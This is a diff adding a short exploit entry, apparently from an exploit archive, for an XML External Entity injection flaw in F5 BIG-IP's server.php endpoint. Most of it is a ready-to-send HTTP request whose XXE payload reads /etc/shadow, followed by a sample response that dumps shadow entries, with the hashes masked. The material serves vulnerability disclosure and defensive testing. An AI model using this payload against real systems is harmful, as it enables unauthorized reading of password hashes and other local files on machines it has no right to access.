@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/57496/info
+
+F5 Networks BIG-IP is prone to an XML External Entity injection vulnerability.
+
+Attackers can exploit this issue to obtain potentially sensitive information from local files on computers running the vulnerable application and to carry out other attacks. 
+
+POST /sam/admin/vpe2/public/php/server.php HTTP/1.1
+Host: bigip
+Cookie: BIGIPAuthCookie=*VALID_COOKIE*
+Content-Length: 143
+
+<?xml  version="1.0" encoding='utf-8' ?>
+<!DOCTYPE a [<!ENTITY e SYSTEM '/etc/shadow'> ]>
+<message><dialogueType>&e;</dialogueType></message>
+
+
+The response includes the content of the file:
+
+<?xml version="1.0" encoding="utf-8"?>
+<message><dialogueType>any</dialogueType><status>generalError</status><command>any</command><accessPolicyName>any</accessPolicyName><messageBody><generalErrorText>Client
+has sent unknown dialogueType '
+root:--hash--:15490::::::
+bin:*:15490::::::
+daemon:*:15490::::::
+adm:*:15490::::::
+lp:*:15490::::::
+mail:*:15490::::::
+uucp:*:15490::::::
+operator:*:15490::::::
+nobody:*:15490::::::
+tmshnobody:*:15490::::::
+admin:--hash--:15490:0:99999:7:::
